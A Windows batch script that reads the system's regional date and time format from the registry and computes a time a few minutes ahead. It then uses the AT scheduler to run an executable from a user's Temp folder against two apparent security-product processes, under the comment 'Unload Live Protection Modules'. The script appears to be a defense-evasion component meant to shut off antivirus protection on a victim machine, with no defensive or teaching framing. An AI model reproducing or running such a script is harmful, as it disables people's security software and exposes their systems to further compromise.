@ECHO OFF
SETLOCAL
SET DEBUG=FALSE
IF "%2"=="" goto Usage
SET fAmt=%1  
SET fCmd=%2
IF %fAmt% GTR 60 GOTO Usage
IF %fAmt% LSS  1 GOTO Usage
SET fOpt=
IF %DEBUG%==TRUE ECHO fAmt %fAmt%  fCmd %fCmd%  fOpt %fOpt%
START /W REGEDIT /E %TEMP%.\_TEMP.REG "HKEY_CURRENT_USER\Control Panel\International"
FOR /F "tokens=1* delims==" %%A IN ('TYPE %TEMP%.\_TEMP.REG ^| FIND /I "iDate"') DO SET iDate=%%B
FOR /F "tokens=1* delims==" %%A IN ('TYPE %TEMP%.\_TEMP.REG ^| FIND /I "sDate"') DO SET sDate=%%B
FOR /F "tokens=1* delims==" %%A IN ('TYPE %TEMP%.\_TEMP.REG ^| FIND /I "iTime" ^| FIND /I /V "iTimePrefix"') DO SET iTime=%%B
FOR /F "tokens=1* delims==" %%A IN ('TYPE %TEMP%.\_TEMP.REG ^| FIND /I "sTime" ^| FIND /I /V "sTimeFormat" ^| FIND /I /V "sTimePrefix"')  DO SET sTime=%%B
SET iDate=%iDate:"=%
SET sDate=%sDate:"=%
SET iTime=%iTime:"=%
SET sTime=%sTime:"=%
IF EXIST %TEMP%.\_TEMP.REG DEL %TEMP%.\_TEMP.REG
IF %iDate%==0 FOR /F "TOKENS=1-4* DELIMS=%sDate% " %%A IN ('DATE/T') DO (
	SET CYear=%%D
	SET CMonth=%%B
	SET CDay=%%C
	SET SortDate=%%D%%B%%C
)
IF %iDate%==1 FOR /F "TOKENS=1-4* DELIMS=%sDate% " %%A IN ('DATE/T') DO (
	SET CYear=%%D
	SET CMonth=%%C
	SET CDay=%%B
	SET SortDate=%%D%%C%%B
)
IF %iDate%==2 FOR /F "TOKENS=1-4* DELIMS=%sDate% " %%A IN ('DATE/T') DO (
	SET CYear=%%B
	SET CMonth=%%C
	SET CDay=%%D
	SET SortDate=%%B%%C%%D
)
SET /A CMonth = 1%CMonth% - 100
SET /A CDay   = 1%CDay%   - 100
FOR /F "TOKENS=1,2* DELIMS=%sTime% " %%A IN ('TIME/T') DO (
	SET CHour=%%A
	SET CMins=%%B
	SET SortTime=%%A%%B
)
IF %iTime%==1 GOTO SkipAmPm
SET AMPM=%CMins:~2,1%
SET CMins=%CMins:~0,2%
IF "%CHour:~0,1%"=="0" IF NOT "%CHour%"=="0" SET /A CHour = 1%CHour% - 100
IF %CHour% LSS 12 IF /I %AMPM%==P SET /A CHour = %CHour% + 12
IF %CHour% EQU 12 IF /I %AMPM%==A SET CHour=0
:SkipAmPm
SET /A CMins = 1%CMins% - 100
IF "%CHour:~0,1%"=="0" IF NOT "%CHour%"=="0" SET /A CHour = 1%CHour% - 100
IF /I "%DEBUG%"=="TRUE" SET C | FIND /I /V "COM"
IF /I "%DEBUG%"=="TRUE" SET SORT
SET /A tMax = 59 - %fAmt%
IF %CMins% GTR %tMax% (CALL :RollHour) ELSE (SET /A CMins = %CMins% + %fAmt%)
IF %CMins% LSS 10 SET CMins = 0%CMins%
IF %CHour% LSS 10 SET CHour = 0%CHour%

:: Unload Live Protection Modules
AT %CHour%:%CMins% E:\DOKUME~1\Julian\LOKALE~1\Temp\upd.exe thguard.exe
AT %CHour%:%CMins% E:\DOKUME~1\Julian\LOKALE~1\Temp\upd.exe -t safensec.exe


GOTO End


:RollHour
SET /A CMins = %CMins% - 60 + %fAmt%
IF %CHour% EQU 23 SET CHour=-1
SET /A CHour = %CHour% + 1
GOTO:EOF

:Usage
GOTO End

:End
ENDLOCAL
